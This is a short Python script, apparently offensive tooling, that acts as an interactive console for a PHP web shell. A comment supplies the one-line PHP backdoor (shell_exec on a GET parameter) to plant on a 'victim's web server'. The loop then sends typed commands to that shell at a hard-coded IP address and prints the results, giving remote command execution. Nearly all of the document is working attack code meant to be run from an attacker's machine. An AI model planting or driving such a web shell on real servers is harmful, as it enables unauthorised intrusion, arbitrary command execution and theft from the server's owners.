import requests
import sys

# Python terminal for PHP Web Shell
# Version 1.0
# 2022-01-04

# Create or upload the PHP Web Shell to the victim's web server/
# echo '<?php echo shell_exec($_GET["cmd"]); ?>' > cmd.php

# Change the full URL accordingly:

while True:
    cmd = str(input('RCE $ '))
    if cmd == 'exit':
        sys.exit(0)
    response = requests.get('http://192.168.2.199/cmd.php', params={'cmd':cmd}, verify=False)
    print(response.text)

# To execute the console run the following command on the attcker machine
# python3 webshell.py
